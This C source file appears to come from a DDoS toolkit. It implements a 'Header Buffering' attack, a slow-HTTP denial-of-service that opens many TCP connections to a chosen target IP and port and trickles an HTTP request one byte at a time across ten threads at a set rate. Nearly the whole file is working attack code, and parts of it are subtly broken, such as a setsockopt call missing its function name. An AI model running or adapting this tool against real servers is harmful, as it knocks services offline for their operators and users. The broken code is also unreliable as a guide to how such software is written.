#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../base/subnet_mask.h"
#include "../ddos/header_buffering.h"

unsigned int headbuffer_total;
unsigned int headbuffer_produced;

unsigned int headbuffer_per_second;
double headbuffer_elapsed_time;

char headbuffer_dest_ip[16];
char headbuffer_src_ip[16];

int headbuffer_dest_port;
int headbuffer_dest_port_start;
int headbuffer_now_port;


int headbuffer_src_ip_mask;
int headbuffer_dest_ip_mask;

char headbuffer_now_src_ip[16];
char headbuffer_now_dest_ip[16];

pthread_mutex_t headbuffer_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t headbuffer_cond = PTHREAD_COND_INITIALIZER;

char headbuffer_request[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];

int *headbuffer_sockets;
unsigned int headbuffer_wait_duration = 1.0;
clock_t *headbuffer_clocks;
unsigned int headbuffer_current;
int *headbuffer_http_cursor;

int headbuffer_maximum = 5;

struct timespec headbuffer_time1, headbuffer_time2;

void header_buffering_print_usage(int mode) {

	if (mode == 1)
		printf(
				"header buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
}

void* generate_header_buffering1(void *data) {
	int thread_id = *((int*) data);

	while (1) {

		pthread_mutex_lock(&headbuffer_mutex);


		/*
		 * generator(headbuffer_src_ip,
				headbuffer_dest_ip,
				headbuffer_src_ip_mask,
				headbuffer_dest_ip_mask,
				headbuffer_dest_port_start,
				headbuffer_dest_port,
				headbuffer_now_src_ip,
				headbuffer_now_dest_ip,
			&headbuffer_now_port);
		*
		* */

		//printf("Log[%d] : T<%d>, S<%d>\n", debug_log++, headbuffer_current,
		//	headbuffer_sockets[headbuffer_current]);

		//making tcp connection
		if (headbuffer_sockets[headbuffer_current] == -2) {

			headbuffer_sockets[headbuffer_current] = socket(AF_INET,
					SOCK_STREAM, 0);

			int sdbf = 2;

			if ((headbuffer_sockets[headbuffer_current], SOL_SOCKET, SO_SNDBUF, (const char*) &sdbf, sizeof(sdbf))
					== -1)
				perror("setsockopt failure.\n");

			if (headbuffer_sockets[headbuffer_current] == -1)
				perror("sock creation failed\n");

			struct sockaddr_in servaddr;
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = inet_addr(headbuffer_dest_ip);
			servaddr.sin_port = htons(headbuffer_dest_port);

			if (connect(headbuffer_sockets[headbuffer_current],
					(struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
				perror("connect failed\n");

			printf("sock value : %d\n", headbuffer_sockets[headbuffer_current]);
		}

		//Conditions begin.
		if (headbuffer_produced >= headbuffer_per_second) {
			pthread_cond_wait(&headbuffer_cond, &headbuffer_mutex);
		}

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &headbuffer_time2);
		double headbuffer_elapsed_time = (headbuffer_time2.tv_sec
				- headbuffer_time1.tv_sec)
				+ ((headbuffer_time2.tv_nsec - headbuffer_time1.tv_nsec)
						/ 1000000000.0);

		//If time > 1.0
		if (headbuffer_elapsed_time >= 1.0) {

			printf("-.\n");
			headbuffer_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &headbuffer_time1);
			pthread_cond_signal(&headbuffer_cond);
		}

		int sent_size = -1;

		if (headbuffer_sockets[headbuffer_current] >= 0) {
			sent_size = write(headbuffer_sockets[headbuffer_current],
					headbuffer_request
							+ headbuffer_http_cursor[headbuffer_current], 1);

			headbuffer_produced++;
			headbuffer_total++;

			printf("%d Socket[%d] send %c : %d\n", headbuffer_produced,
					headbuffer_sockets[headbuffer_current],
					*(headbuffer_request
							+ headbuffer_http_cursor[headbuffer_current]),
					sent_size);

			headbuffer_http_cursor[headbuffer_current] += 1;

			if (headbuffer_http_cursor[headbuffer_current]
					>= __HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
				close(headbuffer_sockets[headbuffer_current]);
				headbuffer_sockets[headbuffer_current] = -1;
			}
			headbuffer_current++;
		}

		if (headbuffer_current >= headbuffer_maximum) {
			headbuffer_current = 0;
		}

		pthread_mutex_unlock(&headbuffer_mutex);
	}

	return 0;

}

void* headbuffer_time_check(void *data) {

	while (1) {
		pthread_mutex_lock(&headbuffer_mutex);
		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &headbuffer_time2);
		double headbuffer_elapsed_time = (headbuffer_time2.tv_sec
				- headbuffer_time1.tv_sec)
				+ ((headbuffer_time2.tv_nsec - headbuffer_time1.tv_nsec)
						/ 1000000000.0);

		//If time > 1.0
		if (headbuffer_elapsed_time >= 1.0) {

			printf("-.\n");
			headbuffer_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &headbuffer_time1);
			pthread_cond_signal(&headbuffer_cond);
		}

		pthread_mutex_unlock(&headbuffer_mutex);
	}
}

void header_buffering_run(char *argv[], int mode) {

	//will be implemented later... ##############
	/*FILE *get_f;

	 get_f = fopen("./src/ddos/http_request.txt", "rb");
	 if (get_f == NULL) {
	 perror("open error! does http_get_request.txt exist?\n");
	 exit(1);
	 }
	 char buffer[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
	 while (fgets(buffer, __HEADER_BUFFERING_REQUEST_MSG_SIZE__, get_f) != NULL) {
	 strcat(headbuffer_request, buffer);
	 strcat(headbuffer_request, "\r\n");
	 }
	 strcat(headbuffer_request, "\r\n");
	 fclose(get_f);
	 */

	strcpy(headbuffer_request, "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");

	printf("HTTP header msg:\n%s\n", headbuffer_request);

	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 4) {
		header_buffering_print_usage(mode);
		return;
	}

	headbuffer_produced = 0;
	get_ip_from_ip_addr(argv[0], headbuffer_src_ip);
	headbuffer_src_ip_mask = get_mask_from_ip_addr(argv[0]);
	strcpy(headbuffer_now_src_ip, headbuffer_src_ip);

	get_ip_from_ip_addr(argv[1], headbuffer_dest_ip);
	headbuffer_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
	strcpy(headbuffer_now_dest_ip, headbuffer_dest_ip);

	if (mode == 1) {

		headbuffer_per_second = atoi(argv[3]);
		//socket preparation & clock preparation
		headbuffer_sockets = (int*) malloc(sizeof(int) * headbuffer_maximum);

		headbuffer_http_cursor = (int*) malloc(
				sizeof(int) * headbuffer_maximum);

		headbuffer_current = 0;

		int tmp;
		for (tmp = 0; tmp < headbuffer_maximum; tmp++) {
			headbuffer_sockets[tmp] = -2;
			headbuffer_http_cursor[tmp] = 0;
		}

		headbuffer_dest_port = atoi(argv[2]);

	}

	int num_threads = 10;

	int *generate_thread_id, *receive_thread_id;
	pthread_t *generate_thread, *receive_thread;
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Header Buffering attack to %s using %d threads\n",
			headbuffer_dest_ip, num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL,
					generate_header_buffering1, (void*) &generate_thread_id[i]);
		if (mode == 2) {
			printf("thread %d created\n", i);
			pthread_create(&generate_thread[i], NULL,
					generate_header_buffering1, (void*) &generate_thread_id[i]);
			/*RECEIVE THREAD DEACTIVATION*/
			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
		}

	}

	pthread_create(&generate_thread[i], NULL, headbuffer_time_check,
			(void*) &generate_thread_id[i]);
	num_threads++;

	for (i = 0; i < num_threads; i++) {
		void *status1, *status2;
		pthread_join(generate_thread[i], &status1);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("Header Buffering attack finished.\n");

	pthread_mutex_destroy(&headbuffer_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);

	return;
}
